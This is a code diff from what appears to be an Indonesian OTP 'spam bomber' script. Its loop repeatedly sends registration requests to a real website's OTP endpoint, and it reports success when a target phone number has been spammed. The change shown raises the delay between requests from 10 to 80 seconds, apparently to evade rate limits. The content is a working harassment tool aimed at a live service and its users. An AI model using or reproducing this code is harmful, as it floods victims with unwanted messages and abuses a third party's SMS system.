@@ -1202,7 +1202,7 @@ headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537
 
 #tools di jalankan
 for i in range(int(jum)):
-    time.sleep(10)
+    time.sleep(80)
     h = requests.post("https://www.asakita.id/api/auth/register/otp",headers=headers,data=data).text
     if 'MOBILE' in h:
         print("\033[32;32mnomor tersebut berhasik di spam")
